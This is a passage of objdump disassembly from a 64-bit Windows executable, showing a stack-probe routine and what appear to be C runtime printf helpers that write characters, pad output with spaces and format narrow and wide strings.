   140003a3c:	c3                   	ret
   140003a3d:	90                   	nop
   140003a3e:	90                   	nop
   140003a3f:	90                   	nop
   140003a40:	51                   	push   %rcx
   140003a41:	50                   	push   %rax
   140003a42:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140003a48:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003a4d:	72 19                	jb     0x140003a68
   140003a4f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140003a56:	48 83 09 00          	orq    $0x0,(%rcx)
   140003a5a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140003a60:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140003a66:	77 e7                	ja     0x140003a4f
   140003a68:	48 29 c1             	sub    %rax,%rcx
   140003a6b:	48 83 09 00          	orq    $0x0,(%rcx)
   140003a6f:	58                   	pop    %rax
   140003a70:	59                   	pop    %rcx
   140003a71:	c3                   	ret
   140003a72:	90                   	nop
   140003a73:	90                   	nop
   140003a74:	90                   	nop
   140003a75:	90                   	nop
   140003a76:	90                   	nop
   140003a77:	90                   	nop
   140003a78:	90                   	nop
   140003a79:	90                   	nop
   140003a7a:	90                   	nop
   140003a7b:	90                   	nop
   140003a7c:	90                   	nop
   140003a7d:	90                   	nop
   140003a7e:	90                   	nop
   140003a7f:	90                   	nop
   140003a80:	55                   	push   %rbp
   140003a81:	53                   	push   %rbx
   140003a82:	48 83 ec 38          	sub    $0x38,%rsp
   140003a86:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003a8b:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140003a8f:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140003a93:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140003a97:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003a9b:	48 89 c1             	mov    %rax,%rcx
   140003a9e:	e8 3d 5d 00 00       	call   0x1400097e0
   140003aa3:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140003aa7:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003aab:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   140003aaf:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003ab4:	49 89 c9             	mov    %rcx,%r9
   140003ab7:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003abd:	48 89 c2             	mov    %rax,%rdx
   140003ac0:	b9 00 60 00 00       	mov    $0x6000,%ecx
   140003ac5:	e8 5f 20 00 00       	call   0x140005b29
   140003aca:	89 c3                	mov    %eax,%ebx
   140003acc:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003ad0:	48 89 c1             	mov    %rax,%rcx
   140003ad3:	e8 92 5d 00 00       	call   0x14000986a
   140003ad8:	89 d8                	mov    %ebx,%eax
   140003ada:	48 83 c4 38          	add    $0x38,%rsp
   140003ade:	5b                   	pop    %rbx
   140003adf:	5d                   	pop    %rbp
   140003ae0:	c3                   	ret
   140003ae1:	90                   	nop
   140003ae2:	90                   	nop
   140003ae3:	90                   	nop
   140003ae4:	90                   	nop
   140003ae5:	90                   	nop
   140003ae6:	90                   	nop
   140003ae7:	90                   	nop
   140003ae8:	90                   	nop
   140003ae9:	90                   	nop
   140003aea:	90                   	nop
   140003aeb:	90                   	nop
   140003aec:	90                   	nop
   140003aed:	90                   	nop
   140003aee:	90                   	nop
   140003aef:	90                   	nop
   140003af0:	55                   	push   %rbp
   140003af1:	53                   	push   %rbx
   140003af2:	48 83 ec 38          	sub    $0x38,%rsp
   140003af6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003afb:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140003aff:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140003b03:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140003b07:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140003b0b:	48 83 7d 28 00       	cmpq   $0x0,0x28(%rbp)
   140003b10:	75 29                	jne    0x140003b3b
   140003b12:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003b16:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003b1a:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140003b1e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003b23:	49 89 c9             	mov    %rcx,%r9
   140003b26:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003b2c:	48 89 c2             	mov    %rax,%rdx
   140003b2f:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003b34:	e8 f0 1f 00 00       	call   0x140005b29
   140003b39:	eb 47                	jmp    0x140003b82
   140003b3b:	48 83 6d 28 01       	subq   $0x1,0x28(%rbp)
   140003b40:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140003b44:	41 89 c0             	mov    %eax,%r8d
   140003b47:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003b4b:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003b4f:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140003b53:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003b58:	49 89 c9             	mov    %rcx,%r9
   140003b5b:	48 89 c2             	mov    %rax,%rdx
   140003b5e:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003b63:	e8 c1 1f 00 00       	call   0x140005b29
   140003b68:	89 c3                	mov    %eax,%ebx
   140003b6a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140003b6e:	39 c3                	cmp    %eax,%ebx
   140003b70:	0f 4e c3             	cmovle %ebx,%eax
   140003b73:	48 63 d0             	movslq %eax,%rdx
   140003b76:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003b7a:	48 01 d0             	add    %rdx,%rax
   140003b7d:	c6 00 00             	movb   $0x0,(%rax)
   140003b80:	89 d8                	mov    %ebx,%eax
   140003b82:	48 83 c4 38          	add    $0x38,%rsp
   140003b86:	5b                   	pop    %rbx
   140003b87:	5d                   	pop    %rbp
   140003b88:	c3                   	ret
   140003b89:	90                   	nop
   140003b8a:	90                   	nop
   140003b8b:	90                   	nop
   140003b8c:	90                   	nop
   140003b8d:	90                   	nop
   140003b8e:	90                   	nop
   140003b8f:	90                   	nop
   140003b90:	55                   	push   %rbp
   140003b91:	48 89 e5             	mov    %rsp,%rbp
   140003b94:	48 83 ec 20          	sub    $0x20,%rsp
   140003b98:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140003b9b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140003b9f:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003ba3:	8b 40 08             	mov    0x8(%rax),%eax
   140003ba6:	25 00 40 00 00       	and    $0x4000,%eax
   140003bab:	85 c0                	test   %eax,%eax
   140003bad:	75 12                	jne    0x140003bc1
   140003baf:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003bb3:	8b 50 28             	mov    0x28(%rax),%edx
   140003bb6:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003bba:	8b 40 24             	mov    0x24(%rax),%eax
   140003bbd:	39 c2                	cmp    %eax,%edx
   140003bbf:	7e 3b                	jle    0x140003bfc
   140003bc1:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003bc5:	8b 40 08             	mov    0x8(%rax),%eax
   140003bc8:	25 00 20 00 00       	and    $0x2000,%eax
   140003bcd:	85 c0                	test   %eax,%eax
   140003bcf:	74 13                	je     0x140003be4
   140003bd1:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003bd5:	48 8b 10             	mov    (%rax),%rdx
   140003bd8:	8b 45 10             	mov    0x10(%rbp),%eax
   140003bdb:	89 c1                	mov    %eax,%ecx
   140003bdd:	e8 e6 64 00 00       	call   0x14000a0c8
   140003be2:	eb 18                	jmp    0x140003bfc
   140003be4:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003be8:	48 8b 10             	mov    (%rax),%rdx
   140003beb:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003bef:	8b 40 24             	mov    0x24(%rax),%eax
   140003bf2:	48 98                	cltq
   140003bf4:	48 01 d0             	add    %rdx,%rax
   140003bf7:	8b 55 10             	mov    0x10(%rbp),%edx
   140003bfa:	88 10                	mov    %dl,(%rax)
   140003bfc:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003c00:	8b 40 24             	mov    0x24(%rax),%eax
   140003c03:	8d 50 01             	lea    0x1(%rax),%edx
   140003c06:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003c0a:	89 50 24             	mov    %edx,0x24(%rax)
   140003c0d:	90                   	nop
   140003c0e:	48 83 c4 20          	add    $0x20,%rsp
   140003c12:	5d                   	pop    %rbp
   140003c13:	c3                   	ret
   140003c14:	55                   	push   %rbp
   140003c15:	48 89 e5             	mov    %rsp,%rbp
   140003c18:	48 83 ec 20          	sub    $0x20,%rsp
   140003c1c:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003c20:	89 55 18             	mov    %edx,0x18(%rbp)
   140003c23:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140003c27:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c2b:	8b 40 10             	mov    0x10(%rax),%eax
   140003c2e:	85 c0                	test   %eax,%eax
   140003c30:	78 16                	js     0x140003c48
   140003c32:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c36:	8b 40 10             	mov    0x10(%rax),%eax
   140003c39:	39 45 18             	cmp    %eax,0x18(%rbp)
   140003c3c:	7e 0a                	jle    0x140003c48
   140003c3e:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c42:	8b 40 10             	mov    0x10(%rax),%eax
   140003c45:	89 45 18             	mov    %eax,0x18(%rbp)
   140003c48:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c4c:	8b 40 0c             	mov    0xc(%rax),%eax
   140003c4f:	39 45 18             	cmp    %eax,0x18(%rbp)
   140003c52:	7d 15                	jge    0x140003c69
   140003c54:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c58:	8b 40 0c             	mov    0xc(%rax),%eax
   140003c5b:	2b 45 18             	sub    0x18(%rbp),%eax
   140003c5e:	89 c2                	mov    %eax,%edx
   140003c60:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c64:	89 50 0c             	mov    %edx,0xc(%rax)
   140003c67:	eb 0b                	jmp    0x140003c74
   140003c69:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c6d:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140003c74:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c78:	8b 40 0c             	mov    0xc(%rax),%eax
   140003c7b:	85 c0                	test   %eax,%eax
   140003c7d:	7e 57                	jle    0x140003cd6
   140003c7f:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c83:	8b 40 08             	mov    0x8(%rax),%eax
   140003c86:	25 00 04 00 00       	and    $0x400,%eax
   140003c8b:	85 c0                	test   %eax,%eax
   140003c8d:	75 47                	jne    0x140003cd6
   140003c8f:	eb 11                	jmp    0x140003ca2
   140003c91:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003c95:	48 89 c2             	mov    %rax,%rdx
   140003c98:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003c9d:	e8 ee fe ff ff       	call   0x140003b90
   140003ca2:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003ca6:	8b 40 0c             	mov    0xc(%rax),%eax
   140003ca9:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003cac:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003cb0:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140003cb3:	85 c0                	test   %eax,%eax
   140003cb5:	75 da                	jne    0x140003c91
   140003cb7:	eb 1d                	jmp    0x140003cd6
   140003cb9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003cbd:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003cc1:	48 89 55 10          	mov    %rdx,0x10(%rbp)
   140003cc5:	0f b6 00             	movzbl (%rax),%eax
   140003cc8:	0f be c0             	movsbl %al,%eax
   140003ccb:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003ccf:	89 c1                	mov    %eax,%ecx
   140003cd1:	e8 ba fe ff ff       	call   0x140003b90
   140003cd6:	8b 45 18             	mov    0x18(%rbp),%eax
   140003cd9:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003cdc:	89 55 18             	mov    %edx,0x18(%rbp)
   140003cdf:	85 c0                	test   %eax,%eax
   140003ce1:	75 d6                	jne    0x140003cb9
   140003ce3:	eb 11                	jmp    0x140003cf6
   140003ce5:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003ce9:	48 89 c2             	mov    %rax,%rdx
   140003cec:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003cf1:	e8 9a fe ff ff       	call   0x140003b90
   140003cf6:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003cfa:	8b 40 0c             	mov    0xc(%rax),%eax
   140003cfd:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003d00:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003d04:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140003d07:	85 c0                	test   %eax,%eax
   140003d09:	7f da                	jg     0x140003ce5
   140003d0b:	90                   	nop
   140003d0c:	90                   	nop
   140003d0d:	48 83 c4 20          	add    $0x20,%rsp
   140003d11:	5d                   	pop    %rbp
   140003d12:	c3                   	ret
   140003d13:	55                   	push   %rbp
   140003d14:	48 89 e5             	mov    %rsp,%rbp
   140003d17:	48 83 ec 20          	sub    $0x20,%rsp
   140003d1b:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003d1f:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140003d23:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140003d28:	75 0b                	jne    0x140003d35
   140003d2a:	48 8d 05 9f 87 00 00 	lea    0x879f(%rip),%rax        # 0x14000c4d0
   140003d31:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003d35:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003d39:	8b 40 10             	mov    0x10(%rax),%eax
   140003d3c:	85 c0                	test   %eax,%eax
   140003d3e:	78 2f                	js     0x140003d6f
   140003d40:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003d44:	8b 40 10             	mov    0x10(%rax),%eax
   140003d47:	48 63 d0             	movslq %eax,%rdx
   140003d4a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003d4e:	48 89 c1             	mov    %rax,%rcx
   140003d51:	e8 ca 59 00 00       	call   0x140009720
   140003d56:	89 c1                	mov    %eax,%ecx
   140003d58:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003d5c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003d60:	49 89 d0             	mov    %rdx,%r8
   140003d63:	89 ca                	mov    %ecx,%edx
   140003d65:	48 89 c1             	mov    %rax,%rcx
   140003d68:	e8 a7 fe ff ff       	call   0x140003c14
   140003d6d:	eb 23                	jmp    0x140003d92
   140003d6f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003d73:	48 89 c1             	mov    %rax,%rcx
   140003d76:	e8 ad 63 00 00       	call   0x14000a128
   140003d7b:	89 c1                	mov    %eax,%ecx
   140003d7d:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003d81:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003d85:	49 89 d0             	mov    %rdx,%r8
   140003d88:	89 ca                	mov    %ecx,%edx
   140003d8a:	48 89 c1             	mov    %rax,%rcx
   140003d8d:	e8 82 fe ff ff       	call   0x140003c14
   140003d92:	90                   	nop
   140003d93:	48 83 c4 20          	add    $0x20,%rsp
   140003d97:	5d                   	pop    %rbp
   140003d98:	c3                   	ret
   140003d99:	55                   	push   %rbp
   140003d9a:	48 89 e5             	mov    %rsp,%rbp
   140003d9d:	48 83 ec 50          	sub    $0x50,%rsp
   140003da1:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003da5:	89 55 18             	mov    %edx,0x18(%rbp)
   140003da8:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140003dac:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003db0:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140003db4:	49 89 d0             	mov    %rdx,%r8
   140003db7:	ba 00 00 00 00       	mov    $0x0,%edx
   140003dbc:	48 89 c1             	mov    %rax,%rcx
   140003dbf:	e8 6c 5c 00 00       	call   0x140009a30
   140003dc4:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140003dc7:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003dcb:	8b 40 10             	mov    0x10(%rax),%eax
   140003dce:	85 c0                	test   %eax,%eax
   140003dd0:	78 16                	js     0x140003de8
   140003dd2:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003dd6:	8b 40 10             	mov    0x10(%rax),%eax
   140003dd9:	39 45 18             	cmp    %eax,0x18(%rbp)
   140003ddc:	7e 0a                	jle    0x140003de8
   140003dde:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003de2:	8b 40 10             	mov    0x10(%rax),%eax
   140003de5:	89 45 18             	mov    %eax,0x18(%rbp)
   140003de8:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003dec:	8b 40 0c             	mov    0xc(%rax),%eax
   140003def:	39 45 18             	cmp    %eax,0x18(%rbp)
   140003df2:	7d 15                	jge    0x140003e09
   140003df4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003df8:	8b 40 0c             	mov    0xc(%rax),%eax
   140003dfb:	2b 45 18             	sub    0x18(%rbp),%eax
   140003dfe:	89 c2                	mov    %eax,%edx
   140003e00:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e04:	89 50 0c             	mov    %edx,0xc(%rax)
   140003e07:	eb 0b                	jmp    0x140003e14
   140003e09:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e0d:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140003e14:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e18:	8b 40 0c             	mov    0xc(%rax),%eax
   140003e1b:	85 c0                	test   %eax,%eax
   140003e1d:	7e 6e                	jle    0x140003e8d
   140003e1f:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e23:	8b 40 08             	mov    0x8(%rax),%eax
   140003e26:	25 00 04 00 00       	and    $0x400,%eax
   140003e2b:	85 c0                	test   %eax,%eax
   140003e2d:	75 5e                	jne    0x140003e8d
   140003e2f:	eb 11                	jmp    0x140003e42
   140003e31:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e35:	48 89 c2             	mov    %rax,%rdx
   140003e38:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003e3d:	e8 4e fd ff ff       	call   0x140003b90
   140003e42:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003e46:	8b 40 0c             	mov    0xc(%rax),%eax
   140003e49:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003e4c:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003e50:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140003e53:	85 c0                	test   %eax,%eax
   140003e55:	75 da                	jne    0x140003e31
   140003e57:	eb 34                	jmp    0x140003e8d
   140003e59:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140003e5d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003e61:	eb 1d                	jmp    0x140003e80
   140003e63:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003e67:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003e6b:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140003e6f:	0f b6 00             	movzbl (%rax),%eax
   140003e72:	0f be c0             	movsbl %al,%eax
   140003e75:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003e79:	89 c1                	mov    %eax,%ecx
   140003e7b:	e8 10 fd ff ff       	call   0x140003b90
   140003e80:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140003e83:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003e86:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140003e89:	85 c0                	test   %eax,%eax
   140003e8b:	7f d6                	jg     0x140003e63
   140003e8d:	8b 45 18             	mov    0x18(%rbp),%eax
   140003e90:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003e93:	89 55 18             	mov    %edx,0x18(%rbp)
   140003e96:	85 c0                	test   %eax,%eax
   140003e98:	7e 41                	jle    0x140003edb
   140003e9a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003e9e:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140003ea2:	48 89 55 10          	mov    %rdx,0x10(%rbp)
   140003ea6:	0f b7 00             	movzwl (%rax),%eax
   140003ea9:	0f b7 d0             	movzwl %ax,%edx
   140003eac:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003eb0:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140003eb4:	49 89 c8             	mov    %rcx,%r8
   140003eb7:	48 89 c1             	mov    %rax,%rcx
   140003eba:	e8 71 5b 00 00       	call   0x140009a30
   140003ebf:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140003ec2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140003ec6:	7f 91                	jg     0x140003e59
   140003ec8:	eb 11                	jmp    0x140003edb
   140003eca:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003ece:	48 89 c2             	mov    %rax,%rdx
   140003ed1:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003ed6:	e8 b5 fc ff ff       	call   0x140003b90
   140003edb:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003edf:	8b 40 0c             	mov    0xc(%rax),%eax
   140003ee2:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003ee5:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140003ee9:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140003eec:	85 c0                	test   %eax,%eax
   140003eee:	7f da                	jg     0x140003eca
   140003ef0:	90                   	nop
   140003ef1:	90                   	nop
   140003ef2:	48 83 c4 50          	add    $0x50,%rsp
   140003ef6:	5d                   	pop    %rbp
   140003ef7:	c3                   	ret
   140003ef8:	55                   	push   %rbp
   140003ef9:	48 89 e5             	mov    %rsp,%rbp
   140003efc:	48 83 ec 20          	sub    $0x20,%rsp
   140003f00:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140003f04:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140003f08:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140003f0d:	75 0b                	jne    0x140003f1a
   140003f0f:	48 8d 05 c2 85 00 00 	lea    0x85c2(%rip),%rax        # 0x14000c4d8
   140003f16:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003f1a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003f1e:	8b 40 10             	mov    0x10(%rax),%eax
   140003f21:	85 c0                	test   %eax,%eax
   140003f23:	78 2f                	js     0x140003f54
   140003f25:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003f29:	8b 40 10             	mov    0x10(%rax),%eax
   140003f2c:	48 63 d0             	movslq %eax,%rdx
   140003f2f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003f33:	48 89 c1             	mov    %rax,%rcx
   140003f36:	e8 35 58 00 00       	call   0x140009770
   140003f3b:	89 c1                	mov    %eax,%ecx
   140003f3d:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003f41:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003f45:	49 89 d0             	mov    %rdx,%r8
   140003f48:	89 ca                	mov    %ecx,%edx
   140003f4a:	48 89 c1             	mov    %rax,%rcx
   140003f4d:	e8 47 fe ff ff       	call   0x140003d99
   140003f52:	eb 23                	jmp    0x140003f77
   140003f54:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003f58:	48 89 c1             	mov    %rax,%rcx
   140003f5b:	e8 e0 61 00 00       	call   0x14000a140
   140003f60:	89 c1                	mov    %eax,%ecx
   140003f62:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140003f66:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003f6a:	49 89 d0             	mov    %rdx,%r8
   140003f6d:	89 ca                	mov    %ecx,%edx
   140003f6f:	48 89 c1             	mov    %rax,%rcx
   140003f72:	e8 22 fe ff ff       	call   0x140003d99
   140003f77:	90                   	nop
   140003f78:	48 83 c4 20          	add    $0x20,%rsp
   140003f7c:	5d                   	pop    %rbp
   140003f7d:	c3                   	ret
   140003f7e:	55                   	push   %rbp
   140003f7f:	48 89 e5             	mov    %rsp,%rbp
   140003f82:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140003f85:	89 55 18             	mov    %edx,0x18(%rbp)
   140003f88:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140003f8c:	8b 45 18             	mov    0x18(%rbp),%eax
   140003f8f:	83 e8 01             	sub    $0x1,%eax
   140003f92:	48 98                	cltq
   140003f94:	48 83 c0 40          	add    $0x40,%rax
   140003f98:	8b 55 18             	mov    0x18(%rbp),%edx
   140003f9b:	48 63 ca             	movslq %edx,%rcx
   140003f9e:	ba 00 00 00 00       	mov    $0x0,%edx
   140003fa3:	48 f7 f1             	div    %rcx
   140003fa6:	89 c2                	mov    %eax,%edx
   140003fa8:	8b 45 10             	mov    0x10(%rbp),%eax
   140003fab:	01 d0                	add    %edx,%eax
   140003fad:	89 45 18             	mov    %eax,0x18(%rbp)
   140003fb0:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003fb4:	8b 40 10             	mov    0x10(%rax),%eax
   140003fb7:	ba 00 00 00 00       	mov    $0x0,%edx
   140003fbc:	85 c0                	test   %eax,%eax
   140003fbe:	0f 48 c2             	cmovs  %edx,%eax
   140003fc1:	01 45 18             	add    %eax,0x18(%rbp)
   140003fc4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003fc8:	8b 40 08             	mov    0x8(%rax),%eax
   140003fcb:	25 00 10 00 00       	and    $0x1000,%eax
   140003fd0:	85 c0                	test   %eax,%eax
   140003fd2:	74 29                	je     0x140003ffd
   140003fd4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140003fd8:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140003fdc:	66 85 c0             	test   %ax,%ax
   140003fdf:	74 1c                	je     0x140003ffd
   140003fe1:	8b 45 18             	mov    0x18(%rbp),%eax
   140003fe4:	48 63 d0             	movslq %eax,%rdx
   140003fe7:	48 69 d2 56 55 55 55 	imul   $0x55555556,%rdx,%rdx
   140003fee:	48 89 d1             	mov    %rdx,%rcx
   140003ff1:	48 c1 e9 20          	shr    $0x20,%rcx
   140003ff5:	99                   	cltd
   140003ff6:	89 c8                	mov    %ecx,%eax
   140003ff8:	29 d0                	sub    %edx,%eax
   140003ffa:	01 45 18             	add    %eax,0x18(%rbp)
   140003ffd:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004001:	8b 50 0c             	mov    0xc(%rax),%edx
   140004004:	8b 45 18             	mov    0x18(%rbp),%eax
   140004007:	39 c2                	cmp    %eax,%edx
   140004009:	0f 4d c2             	cmovge %edx,%eax
   14000400c:	5d                   	pop    %rbp
   14000400d:	c3                   	ret
   14000400e:	55                   	push   %rbp
   14000400f:	53                   	push   %rbx
   140004010:	48 83 ec 58          	sub    $0x58,%rsp
   140004014:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004019:	48 89 cb             	mov    %rcx,%rbx
   14000401c:	48 8b 0b             	mov    (%rbx),%rcx
   14000401f:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140004023:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140004027:	48 89 5d d8          	mov    %rbx,-0x28(%rbp)
   14000402b:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000402f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004033:	49 89 c0             	mov    %rax,%r8
   140004036:	ba 03 00 00 00       	mov    $0x3,%edx
   14000403b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004040:	e8 39 ff ff ff       	call   0x140003f7e
   140004045:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140004048:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   14000404f:	00 
   140004050:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140004053:	48 98                	cltq
   140004055:	48 83 c0 0f          	add    $0xf,%rax
   140004059:	48 c1 e8 04          	shr    $0x4,%rax
   14000405d:	48 c1 e0 04          	shl    $0x4,%rax
   140004061:	e8 da f9 ff ff       	call   0x140003a40
   140004066:	48 29 c4             	sub    %rax,%rsp
   140004069:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000406e:	48 83 c0 0f          	add    $0xf,%rax
   140004072:	48 c1 e8 04          	shr    $0x4,%rax
   140004076:	48 c1 e0 04          	shl    $0x4,%rax
   14000407a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000407e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140004082:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004086:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000408a:	8b 40 08             	mov    0x8(%rax),%eax
   14000408d:	25 80 00 00 00       	and    $0x80,%eax
   140004092:	85 c0                	test   %eax,%eax
   140004094:	0f 84 ea 00 00 00    	je     0x140004184
   14000409a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000409e:	48 85 c0             	test   %rax,%rax
   1400040a1:	79 10                	jns    0x1400040b3
